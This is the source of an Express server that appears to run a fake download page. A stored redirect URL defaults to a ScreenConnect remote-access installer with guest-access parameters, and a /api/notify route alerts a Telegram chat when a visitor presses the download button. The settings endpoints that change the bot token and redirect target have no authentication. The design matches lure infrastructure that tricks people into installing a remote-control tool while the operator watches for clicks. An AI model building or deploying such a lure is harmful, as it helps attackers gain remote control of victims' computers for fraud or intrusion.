import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import dotenv from "dotenv";
import Database from "better-sqlite3";

dotenv.config();

const db = new Database("settings.db");

// Initialize settings table
db.exec(`
  CREATE TABLE IF NOT EXISTS settings (
    id INTEGER PRIMARY KEY CHECK (id = 1),
    bot_token TEXT,
    chat_id TEXT,
    redirect_url TEXT
  )
`);

// Seed initial settings if empty
const initialSettings = db.prepare("SELECT * FROM settings WHERE id = 1").get();
if (!initialSettings) {
  db.prepare(`
    INSERT INTO settings (id, bot_token, chat_id, redirect_url)
    VALUES (1, ?, ?, ?)
  `).run(
    process.env.TELEGRAM_BOT_TOKEN || "",
    process.env.TELEGRAM_CHAT_ID || "",
    "https://professionalgfx.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
  );
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Route to Get Settings
  app.get("/api/settings", (req, res) => {
    try {
      const settings = db.prepare("SELECT * FROM settings WHERE id = 1").get();
      res.json(settings);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch settings" });
    }
  });

  // API Route to Update Settings
  app.post("/api/settings", (req, res) => {
    const { bot_token, chat_id, redirect_url } = req.body;
    try {
      db.prepare(`
        UPDATE settings 
        SET bot_token = ?, chat_id = ?, redirect_url = ?
        WHERE id = 1
      `).run(bot_token, chat_id, redirect_url);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update settings" });
    }
  });

  // API Route for Telegram Notification
  app.post("/api/notify", async (req, res) => {
    const { message } = req.body;
    
    // Get latest settings from DB
    const settings = db.prepare("SELECT * FROM settings WHERE id = 1").get() as any;
    const botToken = settings?.bot_token || process.env.TELEGRAM_BOT_TOKEN;
    const chatId = settings?.chat_id || process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram credentials missing");
      return res.status(500).json({ error: "Telegram configuration missing" });
    }

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message || "Download button activated!",
          parse_mode: "HTML"
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        console.error("Telegram API error:", errorData);
        return res.status(500).json({ error: "Failed to send Telegram notification" });
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Notification error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
